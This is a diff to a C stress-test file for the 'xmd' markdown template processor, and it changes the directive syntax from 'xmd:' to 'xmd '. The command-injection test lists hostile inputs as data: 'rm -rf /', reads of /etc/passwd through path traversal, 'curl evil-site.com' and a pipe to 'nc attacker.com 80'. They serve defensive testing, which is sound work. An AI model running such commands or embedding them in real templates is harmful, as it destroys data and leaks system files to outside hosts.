@@ -37,14 +37,14 @@ void test_infinite_loop_detection(void) {
     
     const char* infinite_loop_test = 
         "# Infinite Loop Test\n\n"
-        "<!-- xmd:set counter=0 -->\n"
-        "<!-- xmd:while true -->\n"  // Potential infinite loop
+        "<!-- xmd set counter=0 -->\n"
+        "<!-- xmd while true -->\n"  // Potential infinite loop
         "  Loop iteration: {{counter}}\n"
-        "  <!-- xmd:set counter={{counter + 1}} -->\n"
-        "  <!-- xmd:if counter > 1000 -->\n"  // Emergency break
-        "    <!-- xmd:break -->\n"
-        "  <!-- xmd:endif -->\n"
-        "<!-- xmd:endwhile -->\n"
+        "  <!-- xmd set counter={{counter + 1}} -->\n"
+        "  <!-- xmd if counter > 1000 -->\n"  // Emergency break
+        "    <!-- xmd break -->\n"
+        "  <!-- xmd endif -->\n"
+        "<!-- xmd endwhile -->\n"
         "\nLoop completed with counter: {{counter}}\n";
     
     // Set up timeout (5 seconds max)
@@ -111,7 +111,7 @@ void test_variable_explosion(void) {
             break;
         }
         
-        pos += sprintf(pos, "<!-- xmd:set var_%d=\"value_%d_", i, i);
+        pos += sprintf(pos, "<!-- xmd set var_%d=\"value_%d_", i, i);
         
         // Add long string content to stress memory
         for (int j = 0; j < 50; j++) {
@@ -158,21 +158,21 @@ void test_command_injection_stress(void) {
     
     const char* injection_tests[] = {
         // Basic injection attempts
-        "<!-- xmd:exec rm -rf / -->",
-        "<!-- xmd:exec cat /etc/passwd -->", 
-        "<!-- xmd:exec curl evil-site.com -->",
+        "<!-- xmd exec rm -rf / -->",
+        "<!-- xmd exec cat /etc/passwd -->", 
+        "<!-- xmd exec curl evil-site.com -->",
         
         // Command chaining
-        "<!-- xmd:exec echo test; rm file -->",
-        "<!-- xmd:exec echo test && evil_command -->",
-        "<!-- xmd:exec echo test | nc attacker.com 80 -->",
+        "<!-- xmd exec echo test; rm file -->",
+        "<!-- xmd exec echo test && evil_command -->",
+        "<!-- xmd exec echo test | nc attacker.com 80 -->",
         
         // Variable injection
-        "<!-- xmd:set cmd=\"rm -rf /\" --><!-- xmd:exec {{cmd}} -->",
+        "<!-- xmd set cmd=\"rm -rf /\" --><!-- xmd exec {{cmd}} -->",
         
         // Path traversal
-        "<!-- xmd:exec cat ../../../etc/passwd -->",
-        "<!-- xmd:exec cat ../../../../../../../../etc/passwd -->",
+        "<!-- xmd exec cat ../../../etc/passwd -->",
+        "<!-- xmd exec cat ../../../../../../../../etc/passwd -->",
         
         NULL
     };
@@ -240,11 +240,11 @@ void test_recursive_template_bomb(void) {
     // Create recursive template structure
     const char* recursive_bomb = 
         "# Recursive Template Test\n\n"
-        "<!-- xmd:set template_a=\"{{template_b}}\" -->\n"
-        "<!-- xmd:set template_b=\"{{template_c}}\" -->\n"
-        "<!-- xmd:set template_c=\"{{template_d}}\" -->\n"
-        "<!-- xmd:set template_d=\"{{template_e}}\" -->\n"
-        "<!-- xmd:set template_e=\"{{template_a}}\" -->\n"  // Circular reference!
+        "<!-- xmd set template_a=\"{{template_b}}\" -->\n"
+        "<!-- xmd set template_b=\"{{template_c}}\" -->\n"
+        "<!-- xmd set template_c=\"{{template_d}}\" -->\n"
+        "<!-- xmd set template_d=\"{{template_e}}\" -->\n"
+        "<!-- xmd set template_e=\"{{template_a}}\" -->\n"  // Circular reference!
         
         "Starting recursive expansion: {{template_a}}\n"
         "This should not cause infinite recursion.\n";
